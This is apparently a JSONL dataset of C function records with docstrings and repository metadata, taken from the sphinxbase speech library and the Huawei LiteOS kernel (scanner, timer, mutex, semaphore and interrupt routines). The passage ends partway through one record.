{"docstring": "/* yy_get_previous_state - get the state just before the EOB char was reached */\n", "func_signal": "static yy_state_type yy_get_previous_state (yyscan_t yyscanner)", "code": "{\n\tyy_state_type yy_current_state;\n\tchar *yy_cp;\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n\n\tyy_current_state = yyg->yy_start;\n\n\tfor ( yy_cp = yyg->yytext_ptr + YY_MORE_ADJ; yy_cp < yyg->yy_c_buf_p; ++yy_cp )\n\t\t{\n\t\tYY_CHAR yy_c = (*yy_cp ? yy_ec[YY_SC_TO_UI(*yy_cp)] : 1);\n\t\tif ( yy_accept[yy_current_state] )\n\t\t\t{\n\t\t\tyyg->yy_last_accepting_state = yy_current_state;\n\t\t\tyyg->yy_last_accepting_cpos = yy_cp;\n\t\t\t}\n\t\twhile ( yy_chk[yy_base[yy_current_state] + yy_c] != yy_current_state )\n\t\t\t{\n\t\t\tyy_current_state = (int) yy_def[yy_current_state];\n\t\t\tif ( yy_current_state >= 98 )\n\t\t\t\tyy_c = yy_meta[(unsigned int) yy_c];\n\t\t\t}\n\t\tyy_current_state = yy_nxt[yy_base[yy_current_state] + (flex_int16_t) yy_c];\n\t\t}\n\n\treturn yy_current_state;\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/* yylex_init is special because it creates the scanner itself, so it is\n * the ONLY reentrant function that doesn't take the scanner as the last argument.\n * That's why we explicitly handle the declaration, instead of using our macros.\n */\n", "func_signal": "int yylex_init(yyscan_t* ptr_yy_globals)", "code": "{\n    if (ptr_yy_globals == NULL){\n        errno = EINVAL;\n        return 1;\n    }\n\n    *ptr_yy_globals = (yyscan_t) yyalloc ( sizeof( struct yyguts_t ), NULL );\n\n    if (*ptr_yy_globals == NULL){\n        errno = ENOMEM;\n        return 1;\n    }\n\n    /* By setting to 0xAA, we expose bugs in yy_init_globals. Leave at 0x00 for releases. */\n    memset(*ptr_yy_globals,0x00,sizeof(struct yyguts_t));\n\n    return yy_init_globals ( *ptr_yy_globals );\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/* generates a random number on [0,1) with 53-bit resolution*/\n", "func_signal": "double\ngenrand_res53(void)", "code": "{\n    unsigned long a = genrand_int32() >> 5, b = genrand_int32() >> 6;\n    return (a * 67108864.0 + b) * (1.0 / 9007199254740992.0);\n}", "path": "sphinxbase/src/libsphinxbase/util/genrand.c", "commit_date": "2016-07-17 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/** Switch to a different input buffer.\n * @param new_buffer The new input buffer.\n * @param yyscanner The scanner object.\n */\n", "func_signal": "void yy_switch_to_buffer  (YY_BUFFER_STATE  new_buffer , yyscan_t yyscanner)", "code": "{\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n\n\t/* TODO. We should be able to replace this entire function body\n\t * with\n\t *\t\tyypop_buffer_state();\n\t *\t\tyypush_buffer_state(new_buffer);\n     */\n\tyyensure_buffer_stack (yyscanner);\n\tif ( YY_CURRENT_BUFFER == new_buffer )\n\t\treturn;\n\n\tif ( YY_CURRENT_BUFFER )\n\t\t{\n\t\t/* Flush out information for old buffer. */\n\t\t*yyg->yy_c_buf_p = yyg->yy_hold_char;\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_buf_pos = yyg->yy_c_buf_p;\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_n_chars = yyg->yy_n_chars;\n\t\t}\n\n\tYY_CURRENT_BUFFER_LVALUE = new_buffer;\n\tyy_load_buffer_state(yyscanner );\n\n\t/* We don't actually know whether we did this switch during\n\t * EOF (yywrap()) processing, but the only time this flag\n\t * is looked at is after yywrap() is called, so it's safe\n\t * to go ahead and always set it.\n\t */\n\tyyg->yy_did_buffer_switch_on_eof = 1;\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/* No stat() on WinCE */\n", "func_signal": "int32\nstat_retry(const char *file, struct stat * statbuf)", "code": "{\n    WIN32_FIND_DATAW file_data;\n    HANDLE *h;\n    wchar_t *wfile;\n    size_t len;\n\n    len = mbstowcs(NULL, file, 0) + 1;\n    wfile = ckd_calloc(len, sizeof(*wfile));\n    mbstowcs(wfile, file, len);\n    if ((h = FindFirstFileW(wfile, &file_data)) == INVALID_HANDLE_VALUE) {\n        ckd_free(wfile);\n        return -1;\n    }\n    ckd_free(wfile);\n    memset(statbuf, 0, sizeof(*statbuf));\n    statbuf->st_mtime = file_data.ftLastWriteTime.dwLowDateTime;\n    statbuf->st_size = file_data.nFileSizeLow;\n    FindClose(h);\n\n    return 0;\n}", "path": "sphinxbase/src/libsphinxbase/util/pio.c", "commit_date": "2017-11-28 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/** Removes and deletes the top of the stack, if present.\n *  The next element becomes the new top.\n *  @param yyscanner The scanner object.\n */\n", "func_signal": "void yypop_buffer_state (yyscan_t yyscanner)", "code": "{\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n\tif (!YY_CURRENT_BUFFER)\n\t\treturn;\n\n\tyy_delete_buffer(YY_CURRENT_BUFFER ,yyscanner);\n\tYY_CURRENT_BUFFER_LVALUE = NULL;\n\tif (yyg->yy_buffer_stack_top > 0)\n\t\t--yyg->yy_buffer_stack_top;\n\n\tif (YY_CURRENT_BUFFER) {\n\t\tyy_load_buffer_state(yyscanner );\n\t\tyyg->yy_did_buffer_switch_on_eof = 1;\n\t}\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/*****************************************************************************\n Function     : LOS_MuxPend\n Description  : Specify the mutex P operation,\n Input        : uwMuxHandle ------ Mutex operation handleone,\n \t\t       uwTimeOut  ------- waiting time,\n Output       : None\n Return       : LOS_OK on success ,or error code on failure\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT UINT32 LOS_MuxPend(UINT32 uwMuxHandle, UINT32 uwTimeout)", "code": "{\n    UINT32     uwIntSave;\n    MUX_CB_S  *pstMuxPended;\n    UINT32     uwRetErr;\n    LOS_TASK_CB  *pstRunTsk;\n    LOS_DL_LIST  *pstPendObj;\n\n    pstMuxPended = GET_MUX(uwMuxHandle);\n    uwIntSave = LOS_IntLock();\n    if ((uwMuxHandle >= (UINT32)LOSCFG_BASE_IPC_MUX_LIMIT)\n    || (OS_MUX_UNUSED == pstMuxPended->ucMuxStat))\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_MUX_INVALID;\n    }\n\n    if (OS_INT_ACTIVE)\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_MUX_PEND_INTERR;\n    }\n\n    pstRunTsk = (LOS_TASK_CB *)g_stLosTask.pstRunTask;\n    if (pstMuxPended->usMuxCount == 0)\n    {\n        pstMuxPended->usMuxCount++;\n        pstMuxPended->pstOwner = pstRunTsk;\n        pstMuxPended->usPriority = pstRunTsk->usPriority;\n        LOS_IntRestore(uwIntSave);\n        return LOS_OK;\n    }\n\n    if (pstMuxPended->pstOwner == pstRunTsk)\n    {\n        pstMuxPended->usMuxCount++;\n        LOS_IntRestore(uwIntSave);\n        return LOS_OK;\n    }\n\n    if (!uwTimeout)\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_MUX_UNAVAILABLE;\n    }\n\n    if (g_usLosTaskLock)\n    {\n        uwRetErr = LOS_ERRNO_MUX_PEND_IN_LOCK;\n        PRINT_ERR(\"!!!LOS_ERRNO_MUX_PEND_IN_LOCK!!!\\n\");\n        goto errre_uniMuxPend;\n    }\n\n    LOS_PriqueueDequeue(&pstRunTsk->stPendList);\n    pstRunTsk->usTaskStatus &= (~OS_TASK_STATUS_READY);\n    pstRunTsk->pTaskMux = (VOID *)pstMuxPended;\n    pstPendObj = &pstRunTsk->stPendList;\n    pstRunTsk->usTaskStatus |= OS_TASK_STATUS_PEND;\n    if ((pstMuxPended->pstOwner->usPriority) > pstRunTsk->usPriority)\n    {\n        osTaskPriModify(pstMuxPended->pstOwner, pstRunTsk->usPriority);\n    }\n\n    LOS_ListTailInsert(&pstMuxPended->stMuxList, pstPendObj);\n    if (uwTimeout != LOS_WAIT_FOREVER)\n    {\n        pstRunTsk->usTaskStatus |= OS_TASK_STATUS_TIMEOUT;\n        osTaskAdd2TimerList((LOS_TASK_CB *)pstRunTsk, uwTimeout);\n        (VOID)LOS_IntRestore(uwIntSave);\n        LOS_Schedule();\n    }\n    else\n    {\n        pstRunTsk->usTaskStatus &= (~OS_TASK_STATUS_TIMEOUT);\n        (VOID)LOS_IntRestore(uwIntSave);\n        LOS_Schedule();\n    }\n\n    if (pstRunTsk->usTaskStatus & OS_TASK_STATUS_TIMEOUT)\n    {\n        uwIntSave = LOS_IntLock();\n        pstRunTsk->usTaskStatus &= (~OS_TASK_STATUS_TIMEOUT);\n        (VOID)LOS_IntRestore(uwIntSave);\n        uwRetErr = LOS_ERRNO_MUX_TIMEOUT;\n        goto error_uniMuxPend;\n    }\n\n    return LOS_OK;\n\nerrre_uniMuxPend:\n    (VOID)LOS_IntRestore(uwIntSave);\nerror_uniMuxPend:\n    return (uwRetErr);\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/ipc/los_mux.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\nFunction   : osSwtmrScan\nDescription: Tick interrupt interface module of Software Timer\nInput      : None\nOutput     : None\nReturn     : LOS_OK on success or error code on failure\n*****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT UINT32 osSwtmrScan(VOID)", "code": "{\n    if (m_pstSwtmrSortList != NULL)\n    {\n        if (--(m_pstSwtmrSortList->uwCount) == 0)\n        {\n            osSwTmrTimeoutHandle();\n        }\n    }\n    return LOS_OK;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/core/los_swtmr.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function     : LOS_MuxDelete\n Description  : Delete a mutex,\n Input        : uwMuxHandle------Mutex operation handle\n Output       : None\n Return       : LOS_OK on success ,or error code on failure\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT_INIT UINT32 LOS_MuxDelete(UINT32 uwMuxHandle)", "code": "{\n    UINT32    uwIntSave;\n    MUX_CB_S *pstMuxDeleted;\n\n   pstMuxDeleted = GET_MUX(uwMuxHandle);\n   uwIntSave = LOS_IntLock();\n   if ((uwMuxHandle >= (UINT32)LOSCFG_BASE_IPC_MUX_LIMIT) ||\n        (OS_MUX_UNUSED == pstMuxDeleted->ucMuxStat))\n   {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_MUX_INVALID;\n    }\n\n   if (!LOS_ListEmpty(&pstMuxDeleted->stMuxList) || pstMuxDeleted->usMuxCount)\n   {\n       LOS_IntRestore(uwIntSave);\n       return LOS_ERRNO_MUX_PENDED;\n    }\n\n   LOS_ListAdd(&g_stUnusedMuxList, &pstMuxDeleted->stMuxList);\n   pstMuxDeleted->ucMuxStat = OS_MUX_UNUSED;\n\n   LOS_IntRestore(uwIntSave);\n\n    return LOS_OK;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/ipc/los_mux.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\nFunction   : osSwTmrTimeoutHandle\nDescription: Software Timer time out handler\nInput      : None\nOutput     : None\nReturn     : None\n*****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT static VOID osSwTmrTimeoutHandle(VOID)", "code": "{\n    SWTMR_HANDLER_ITEM_P pstSwtmrHandler;\n    SWTMR_CTRL_S *pstSwtmr = m_pstSwtmrSortList;\n\n    while (pstSwtmr != NULL && pstSwtmr->uwCount == 0)\n    {\n        m_pstSwtmrSortList = pstSwtmr->pstNext;\n        pstSwtmrHandler = (SWTMR_HANDLER_ITEM_P)LOS_MemboxAlloc(m_aucSwTmrHandlerPool);\n\n        if (pstSwtmrHandler != NULL)\n        {\n            pstSwtmrHandler->pfnHandler = pstSwtmr->pfnHandler;\n            pstSwtmrHandler->uwArg = pstSwtmr->uwArg;\n\n            if (LOS_QueueWrite(m_uwSwTmrHandlerQueue, pstSwtmrHandler, sizeof(UINT32), LOS_NO_WAIT))\n            {\n                (VOID)LOS_MemboxFree(m_aucSwTmrHandlerPool, pstSwtmrHandler);\n            }\n        }\n\n        if (pstSwtmr->ucMode == LOS_SWTMR_MODE_ONCE)\n        {\n            osSwtmrDelete(pstSwtmr);\n\n            if (pstSwtmr->usTimerID < OS_SWTMR_MAX_TIMERID - LOSCFG_BASE_CORE_SWTMR_LIMIT)\n                pstSwtmr->usTimerID += LOSCFG_BASE_CORE_SWTMR_LIMIT;\n            else\n                pstSwtmr->usTimerID %= LOSCFG_BASE_CORE_SWTMR_LIMIT;\n        }\n        else\n        {\n            pstSwtmr->ucOverrun++;\n            osSwTmrStart(pstSwtmr);\n        }\n\n        pstSwtmr = m_pstSwtmrSortList;\n    }\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/core/los_swtmr.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\nFunction   : osSwTmrInit\nDescription: Initializes Software Timer\nInput      : None\nOutput     : None\nReturn     : LOS_OK on success or error code on failure\n*****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT_INIT UINT32 osSwTmrInit(VOID)", "code": "{\n    UINT32 uwSize;\n    UINT16 usIndex;\n    UINT32 uwRet;\n    SWTMR_CTRL_S *pstSwtmr;\n    SWTMR_CTRL_S *pstTemp;\n\n    if (0 == LOSCFG_BASE_CORE_SWTMR_LIMIT)  /*lint !e506*/\n    {\n        return LOS_ERRNO_SWTMR_MAXSIZE_INVALID;\n    }\n\n    m_pstSwtmrSortList = (SWTMR_CTRL_S *)NULL;\n    uwSize = sizeof(SWTMR_CTRL_S) * LOSCFG_BASE_CORE_SWTMR_LIMIT;\n    pstSwtmr = (SWTMR_CTRL_S *)LOS_MemAlloc(m_aucSysMem0, uwSize);\n    if (NULL == pstSwtmr)\n    {\n        return LOS_ERRNO_SWTMR_NO_MEMORY;\n    }\n\n    (VOID)memset((void *)pstSwtmr, 0, uwSize);\n    m_pstSwtmrCBArray = pstSwtmr;\n    m_pstSwtmrFreeList = pstSwtmr;\n    pstSwtmr->usTimerID = 0;\n    pstTemp = pstSwtmr;\n    pstSwtmr++;\n    for (usIndex = 1; usIndex < LOSCFG_BASE_CORE_SWTMR_LIMIT; usIndex++, pstSwtmr++)\n    {\n        pstSwtmr->usTimerID = usIndex;\n        pstTemp->pstNext = pstSwtmr;\n        pstTemp = pstSwtmr;\n    }\n\n    uwRet = LOS_MemboxInit(m_aucSwTmrHandlerPool, sizeof(m_aucSwTmrHandlerPool), sizeof(SWTMR_HANDLER_ITEM_S));\n    if (uwRet != LOS_OK)\n    {\n        return LOS_ERRNO_SWTMR_HANDLER_POOL_NO_MEM;\n    }\n\n    uwRet = LOS_QueueCreate((CHAR *)NULL, OS_SWTMR_HANDLE_QUEUE_SIZE, &m_uwSwTmrHandlerQueue, 0, sizeof(SWTMR_HANDLER_ITEM_P));\n    if (uwRet != LOS_OK)\n    {\n        return LOS_ERRNO_SWTMR_QUEUE_CREATE_FAILED;\n    }\n\n    uwRet = osSwTmrTaskCreate();\n    if (LOS_OK != uwRet)\n    {\n        return LOS_ERRNO_SWTMR_TASK_CREATE_FAILED;\n    }\n\n    return LOS_OK;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/core/los_swtmr.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\nFunction   : LOS_SwtmrCreate\nDescription: Create software timer\nInput      : uwInterval\n             usMode\n             pfnHandler\n             uwArg\nOutput     : pusSwTmrID\nReturn     : LOS_OK on success or error code on failure\n*****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT_INIT UINT32 LOS_SwtmrCreate(UINT32  uwInterval,\n                                        UINT8           ucMode,\n                                        SWTMR_PROC_FUNC pfnHandler,\n                                        UINT16          *pusSwTmrID,\n                                        UINT32          uwArg)", "code": "{\n    SWTMR_CTRL_S  *pstSwtmr;\n    UINTPTR  uvIntSave;\n\n    if (0 == uwInterval)\n    {\n        return LOS_ERRNO_SWTMR_INTERVAL_NOT_SUITED;\n    }\n\n    if ((LOS_SWTMR_MODE_ONCE != ucMode) && (LOS_SWTMR_MODE_PERIOD != ucMode))\n    {\n        return LOS_ERRNO_SWTMR_MODE_INVALID;\n    }\n\n    if (NULL == pfnHandler)\n    {\n        return LOS_ERRNO_SWTMR_PTR_NULL;\n    }\n\n    if (NULL == pusSwTmrID)\n    {\n        return LOS_ERRNO_SWTMR_RET_PTR_NULL;\n    }\n\n    uvIntSave = LOS_IntLock();\n    if (NULL == m_pstSwtmrFreeList)\n    {\n        LOS_IntRestore(uvIntSave);\n        return LOS_ERRNO_SWTMR_MAXSIZE;\n    }\n\n    pstSwtmr = m_pstSwtmrFreeList;\n    m_pstSwtmrFreeList = pstSwtmr->pstNext;\n    LOS_IntRestore(uvIntSave);\n    pstSwtmr->pfnHandler    = pfnHandler;\n    pstSwtmr->ucMode        = ucMode;\n    pstSwtmr->ucOverrun     = 0;\n    pstSwtmr->uwInterval    = uwInterval;\n    pstSwtmr->uwExpiry      = uwInterval;\n    pstSwtmr->pstNext       = (SWTMR_CTRL_S *)NULL;\n    pstSwtmr->uwCount       = 0;\n    pstSwtmr->uwArg         = uwArg;\n    pstSwtmr->ucState       = OS_SWTMR_STATUS_CREATED;\n    *pusSwTmrID = pstSwtmr->usTimerID;\n\n    return LOS_OK;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/core/los_swtmr.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\nFunction   : LOS_SwtmrStop\nDescription: Stop software timer\nInput      : usSwTmrID ------- Software timer ID\nOutput     : None\nReturn     : LOS_OK on success or error code on failure\n*****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT UINT32 LOS_SwtmrStop(UINT16 usSwTmrID)", "code": "{\n    SWTMR_CTRL_S *pstSwtmr;\n    UINTPTR uvIntSave;\n    UINT32 uwRet = LOS_OK;\n    UINT16 usSwTmrCBID;\n\n    if (usSwTmrID >= OS_SWTMR_MAX_TIMERID)\n    {\n        return LOS_ERRNO_SWTMR_ID_INVALID;\n    }\n\n    uvIntSave = LOS_IntLock();\n    usSwTmrCBID = usSwTmrID % LOSCFG_BASE_CORE_SWTMR_LIMIT;\n    pstSwtmr = m_pstSwtmrCBArray + usSwTmrCBID;\n\n    if (pstSwtmr->usTimerID != usSwTmrID)\n    {\n        LOS_IntRestore(uvIntSave);\n        return LOS_ERRNO_SWTMR_ID_INVALID;\n    }\n\n    switch (pstSwtmr->ucState)\n    {\n    case OS_SWTMR_STATUS_UNUSED:\n        uwRet = LOS_ERRNO_SWTMR_NOT_CREATED;\n        break;\n    case OS_SWTMR_STATUS_CREATED:\n        uwRet = LOS_ERRNO_SWTMR_NOT_STARTED;\n        break;\n    case OS_SWTMR_STATUS_TICKING:\n        osSwtmrStop(pstSwtmr);\n        break;\n    default:\n        uwRet = LOS_ERRNO_SWTMR_STATUS_INVALID;\n        break;\n    }\n\n    LOS_IntRestore(uvIntSave);\n    return uwRet;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/core/los_swtmr.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function    : osHwiInit\n Description : initialization of the hardware interrupt\n Input       : None\n Output      : None\n Return      : OS_SUCCESS\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT_INIT VOID osHwiInit()", "code": "{\n    UINT32 uwIndex;\n    for(uwIndex = OS_M4_SYS_VECTOR_CNT; uwIndex < OS_M4_VECTOR_CNT; uwIndex++)\n    {\n        m_pstHwiForm[uwIndex] = osHwiDefaultHandler;\n    }\n\n    /* Interrupt vector table location */\n     *(volatile UINT32 *)OS_NVIC_VTOR =  (UINT32)m_pstHwiForm;\n\n     *(volatile UINT32 *)OS_NVIC_AIRCR = (0x05FA0000 | OS_NVIC_AIRCR_PRIGROUP << 8);\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/platform/cpu/arm/cortex-m4/los_hwi.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\nFunction   : LOS_SwtmrStart\nDescription: Start software timer\nInput      : usSwTmrID ------- Software timer ID\nOutput     : None\nReturn     : LOS_OK on success or error code on failure\n*****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT UINT32 LOS_SwtmrStart(UINT16 usSwTmrID)", "code": "{\n    SWTMR_CTRL_S  *pstSwtmr;\n    UINTPTR  uvIntSave;\n    UINT32 uwRet = LOS_OK;\n    UINT16 usSwTmrCBID;\n\n    if (usSwTmrID >= OS_SWTMR_MAX_TIMERID)\n    {\n        return LOS_ERRNO_SWTMR_ID_INVALID;\n    }\n\n    uvIntSave = LOS_IntLock();\n    usSwTmrCBID = usSwTmrID % LOSCFG_BASE_CORE_SWTMR_LIMIT;\n    pstSwtmr = m_pstSwtmrCBArray + usSwTmrCBID;\n\n    if (pstSwtmr->usTimerID != usSwTmrID)\n    {\n        LOS_IntRestore(uvIntSave);\n        return LOS_ERRNO_SWTMR_ID_INVALID;\n    }\n\n    switch (pstSwtmr->ucState)\n    {\n    case OS_SWTMR_STATUS_UNUSED:\n        uwRet = LOS_ERRNO_SWTMR_NOT_CREATED;\n        break;\n    case OS_SWTMR_STATUS_TICKING:\n        osSwtmrStop(pstSwtmr);\n    case OS_SWTMR_STATUS_CREATED: /*lint !e616*/\n        osSwTmrStart(pstSwtmr);\n        break;\n    default:\n        uwRet = LOS_ERRNO_SWTMR_STATUS_INVALID;\n        break;\n    }\n\n    LOS_IntRestore(uvIntSave);\n    return uwRet;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/core/los_swtmr.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function    : osHwiDefaultHandler\n Description : default handler of the hardware interrupt\n Input       : None\n Output      : None\n Return      : None\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT_MINOR VOID  osHwiDefaultHandler(VOID)", "code": "{\n    UINT32 irq_num = osIntNumGet();\n    while(1);\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/platform/cpu/arm/cortex-m4/los_hwi.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\nFunction   : osSwTmrDelete\nDescription: Delete Software Timer\nInput      : pstSwtmr --- Need to delete Software Timer, When using, Ensure that it can't be NULL.\nOutput     : None\nReturn     : None\n*****************************************************************************/\n", "func_signal": "INLINE VOID osSwtmrDelete(SWTMR_CTRL_S *pstSwtmr)", "code": "{\n    /**insert to free list **/\n    pstSwtmr->pstNext = m_pstSwtmrFreeList;\n    m_pstSwtmrFreeList = pstSwtmr;\n    pstSwtmr->ucState = OS_SWTMR_STATUS_UNUSED;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/core/los_swtmr.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function     : LOS_SemCreate\n Description  : Create a semaphore,\n Input        : uwCount--------- semaphore count,\n Output       : puwSemHandle-----Index of semaphore,\n Return       : LOS_OK on success ,or error code on failure\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT_INIT UINT32 LOS_SemCreate (UINT16 usCount, UINT32 *puwSemHandle)", "code": "{\n    UINT32      uwIntSave;\n    SEM_CB_S    *pstSemCreated;\n    LOS_DL_LIST *pstUnusedSem;\n\n    if (NULL == puwSemHandle)\n    {\n        return LOS_ERRNO_SEM_PTR_NULL;\n    }\n\n    if (usCount > OS_SEM_COUNT_MAX)\n    {\n        return LOS_ERRNO_SEM_OVERFLOW;\n    }\n\n    uwIntSave = LOS_IntLock();\n\n    if (LOS_ListEmpty(&g_stUnusedSemList))\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_SEM_ALL_BUSY;\n    }\n\n    pstUnusedSem = LOS_DL_LIST_FIRST(&(g_stUnusedSemList));\n    LOS_ListDelete(pstUnusedSem);\n    pstSemCreated = (GET_SEM_LIST(pstUnusedSem)); /*lint !e413*/\n    pstSemCreated->uwSemCount = usCount;\n    pstSemCreated->usSemStat = OS_SEM_USED;\n    LOS_ListInit(&pstSemCreated->stSemList);\n    *puwSemHandle = (UINT32)pstSemCreated->usSemID;\n    LOS_IntRestore(uwIntSave);\n    return LOS_OK;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/ipc/los_sem.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\nFunction   : osSwTmrStart\nDescription: Start Software Timer\nInput      : pstSwtmr ---------- Need to start Software Timer\nOutput     : None\nReturn     : None\n*****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT VOID osSwTmrStart(SWTMR_CTRL_S *pstSwtmr)", "code": "{\n    SWTMR_CTRL_S *pstPrev = (SWTMR_CTRL_S *)NULL;\n    SWTMR_CTRL_S *pstCur = (SWTMR_CTRL_S *)NULL;\n\n    if (pstSwtmr->ucOverrun == 0 && (pstSwtmr->ucMode == LOS_SWTMR_MODE_ONCE || pstSwtmr->ucMode == LOS_SWTMR_MODE_OPP))\n    {\n        pstSwtmr->uwCount = pstSwtmr->uwExpiry;\n    }\n    else\n    {\n        pstSwtmr->uwCount = pstSwtmr->uwInterval;\n    }\n    pstCur = m_pstSwtmrSortList;\n\n    while (pstCur != NULL)\n    {\n        if (pstCur->uwCount > pstSwtmr->uwCount)\n        {\n            break;\n        }\n\n        pstSwtmr->uwCount -= pstCur->uwCount;\n        pstPrev = pstCur;\n        pstCur = pstCur->pstNext;\n    }\n\n    pstSwtmr->pstNext = pstCur;\n\n    if (pstCur != NULL)\n    {\n        pstCur->uwCount -= pstSwtmr->uwCount;\n    }\n\n    if (pstPrev == NULL)\n    {\n        m_pstSwtmrSortList = pstSwtmr;\n    }\n    else\n    {\n        pstPrev->pstNext = pstSwtmr;\n    }\n\n    pstSwtmr->ucState = OS_SWTMR_STATUS_TICKING;\n\n    return;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/core/los_swtmr.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function     : LOS_MuxPost\n Description  : Specify the mutex V operation,\n Input        : uwMuxHandle ------ Mutex operation handle,\n Output       : None\n Return       : LOS_OK on success ,or error code on failure\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT UINT32 LOS_MuxPost(UINT32 uwMuxHandle)", "code": "{\n    UINT32      uwIntSave;\n    MUX_CB_S    *pstMuxPosted = GET_MUX(uwMuxHandle);\n    LOS_TASK_CB *pstResumedTask;\n    LOS_TASK_CB *pstRunTsk;\n\n    uwIntSave = LOS_IntLock();\n\n    if ((uwMuxHandle >= (UINT32)LOSCFG_BASE_IPC_MUX_LIMIT) ||\n        (OS_MUX_UNUSED == pstMuxPosted->ucMuxStat))\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_MUX_INVALID;\n    }\n\n    if (OS_INT_ACTIVE)\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_MUX_PEND_INTERR;\n    }\n\n    pstRunTsk = 